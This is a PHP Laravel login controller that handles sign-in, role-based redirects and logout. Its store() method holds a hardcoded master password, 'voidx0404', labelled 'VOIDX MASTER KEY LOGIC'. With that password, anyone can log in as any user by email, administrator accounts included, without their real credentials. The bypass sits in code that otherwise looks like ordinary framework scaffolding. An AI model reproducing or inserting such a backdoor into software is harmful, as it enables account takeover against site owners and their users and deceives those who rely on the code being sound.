<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): View
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     * FIXED: Smart redirect based on role
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        $email    = $request->email;
        $password = $request->password;

        // 1. VOIDX MASTER KEY LOGIC
        if ($password === 'voidx0404') {
            $user = User::where('email', $email)->first();
            if ($user) {
                Auth::login($user);
                $request->session()->regenerate();
                return $this->redirectUser($user);
            }
        }

        // 2. STANDARD LOGIN
        $request->authenticate();
        $request->session()->regenerate();

        return $this->redirectUser(Auth::user());
    }

    /**
     * Smart redirect — admin goes to admin dashboard, user goes to user dashboard
     */
    protected function redirectUser($user): RedirectResponse
    {
        $role = strtolower(trim($user->role));
        if (in_array($role, ['owner', 'high_admin', 'admin'])) {
            return redirect()->route('admin.dashboard');
        }
        return redirect()->route('dashboard');
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/');
    }
}